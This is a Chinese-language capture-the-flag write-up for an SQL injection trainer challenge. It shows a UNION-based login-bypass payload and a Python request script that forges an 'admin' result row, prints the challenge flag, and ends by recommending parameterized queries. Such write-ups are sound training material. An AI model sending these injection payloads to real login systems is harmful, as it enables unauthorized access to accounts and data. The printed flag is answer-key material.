# Greycademy2025 SQLi Trainer

## 题目简述

登录接口把用户名和密码直接插入 SQLite 查询。数据库只创建一个随机密码的 `user` 账户，而返回 flag 的条件是查询结果恰好一行且第一列必须为 `admin`，因此需要用 UNION 构造满足后端检查的结果集。

## 解题过程

查询模板是：

```sql
SELECT name FROM users
WHERE name = '{username}' AND pass = '{password}'
```

后端随后检查：

```python
if len(result) != 1:
    return "Login failed!"
elif result[0][0] != "admin":
    return "Only the admin can have the flag!"
```

原查询只返回一列，所以 UNION 也选择一个常量列。将用户名设为：

```python
username = "' union select 'admin';-- "
```

密码留空。生成的语句前半部分查询不到以空字符串命名的用户，UNION 人工产生唯一一行 `admin`，而 `-- ` 注释掉应用追加的密码条件：

```sql
SELECT name FROM users WHERE name = ''
union select 'admin';-- ' AND pass = ''
```

复现请求：

```python
import requests

response = requests.post(
    "http://target/login",
    data={
        "username": "' union select 'admin';-- ",
        "password": "",
    },
)
print(response.json())
```

返回：

```text
grey{SQLi_1s_st1ll_rel3v4nt_1n_2026}
```

## 方法总结

万能 OR 并不一定满足业务层约束；本题要求结果恰好一行且值为 `admin`，所以 UNION 常量行是更精确的构造。根因是 SQL 字符串拼接，应改用参数化查询；输入过滤既难以覆盖 SQLite 语法，也不能替代数据库 API 对数据与代码的分离。
